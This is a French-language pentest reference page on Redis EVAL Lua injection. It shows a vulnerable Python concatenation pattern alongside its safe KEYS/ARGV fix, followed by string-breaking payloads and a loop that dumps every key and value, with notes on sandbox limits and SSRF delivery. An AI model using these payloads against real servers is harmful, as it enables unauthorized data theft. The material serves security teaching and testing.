---
title: "EVAL : injection dans les scripts Lua côté serveur"
description: "EVAL exécute un script Lua à l'intérieur de Redis ; l'injection dans le corps du script ou ses arguments permet à un attaquant de piloter redis.call() et d'atteindre chaque clé côté serveur."
keywords:
  - EVAL
  - injection Lua Redis
  - redis.call
  - bac à sable Lua
  - KEYS ARGV
---

# EVAL

`EVAL` exécute un script Lua sur le serveur Redis. Sa forme est `EVAL <script> <numkeys> [key ...] [arg ...]` : le texte du script, un compte d'arguments de clé, puis les clés (disponibles en Lua sous `KEYS[1..n]`) et les arguments supplémentaires (`ARGV[1..n]`). Le script s'exécute atomiquement et peut rappeler Redis via `redis.call()` et `redis.pcall()`.

## Schéma vulnérable

L'injection apparaît lorsque le code de l'application construit le **corps du script** à partir de l'entrée utilisateur au lieu de passer cette entrée comme `ARGV` :

```python
# user_val concatenated into the script text
script = "return redis.call('GET', '" + user_val + "')"
r.eval(script, 0)
```

La forme sûre maintient le script constant et lie la valeur : `r.eval("return redis.call('GET', KEYS[1])", 1, user_val)`. La forme injectable laisse `user_val` fermer le littéral de chaîne et ajouter du Lua.

## S'échapper du script

Comme la valeur atterrit à l'intérieur d'une chaîne Lua entre guillemets simples, un guillemet la ferme et le reste est analysé comme du Lua. Le script doit rester un seul chunk valide : un second `return` nu ne compilera pas, chaînez donc sur le `return` d'origine avec un opérateur Lua (`or`, `..`) et terminez par un commentaire de ligne `--` pour écarter la partie finale du script d'origine :

```lua
x') or redis.call('KEYS', '*') --
```

Cela s'analyse comme `return redis.call('GET','x') or redis.call('KEYS','*')` : le GET échoue et renvoie false, de sorte que le second appel s'exécute et son résultat est renvoyé. La chaîne `or` atteint toute commande que les scripts sont autorisés à exécuter :

```lua
x') or redis.call('MGET', unpack(redis.call('KEYS','*'))) --
```

Certaines commandes administratives sont marquées **no-script** et sont rejetées à l'intérieur d'`EVAL`, y compris `CONFIG`. La chaîne d'écriture sur disque de [Abus de CONFIG SET](../config-set-abuse.md) ne peut donc pas s'exécuter depuis Lua ; elle nécessite une exécution de commande directe.

## Lire et exfiltrer en masse

Les boucles Lua permettent à un seul script de balayer l'espace de clés et de tout renvoyer en une seule réponse, une extraction efficace sans aveugle :

```lua
return redis.call('KEYS', '*')
```

```lua
local out = {}
for _, k in ipairs(redis.call('KEYS', '*')) do
  out[#out+1] = k .. '=' .. tostring(redis.call('GET', k))
end
return out
```

Un `EVAL` entièrement fourni par l'attaquant (par exemple via une connexion smugglée par SSRF, voir [Injection de commande](../command.md)) peut transporter cela comme corps entier.

## Notes sur le bac à sable

L'environnement Lua est mis en bac à sable : `os`, `io` et `loadfile` sont retirés ou restreints, et les globals sont figés, de sorte que l'exécution directe de shell depuis Lua n'est pas la voie prévue. L'impact vient plutôt de `redis.call()` atteignant les commandes du plan de données (`KEYS`, `MGET`, `GET`, `SET`, `SCAN`), qui lisent et réécrivent chaque clé côté serveur. Les commandes administratives qui pilotent la chaîne RCE d'écriture sur disque (`CONFIG`, `DEBUG`, `SLAVEOF`/`REPLICAOF`) sont marquées no-script et sont rejetées depuis l'intérieur d'un script, de sorte que cette voie nécessite une exécution de commande directe, pas Lua. Le bac à sable a historiquement été évadé sur des versions spécifiques via des bugs d'interpréteur, mais la primitive indépendante de la version est simplement l'accès complet aux commandes de données via `redis.call()`. `redis.call()` lève une erreur et interrompt le script ; `redis.pcall()` renvoie l'erreur sous forme de table, utile pour sonder quelles commandes sont permises sans tuer le script.

## Outils

- **redis-cli** : exécuter des payloads EVAL et inspecter les résultats renvoyés.
- **Gopherus** : faire passer un corps EVAL complet via une connexion RESP SSRF.
- **Burp Repeater** : livrer l'évasion de corps de script via le paramètre.

## Références

- [Redis : EVAL](https://redis.io/docs/latest/commands/eval/)
- [Redis : scripting with Lua](https://redis.io/docs/latest/develop/interact/programmability/eval-intro/)
- [PayloadsAllTheThings : NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
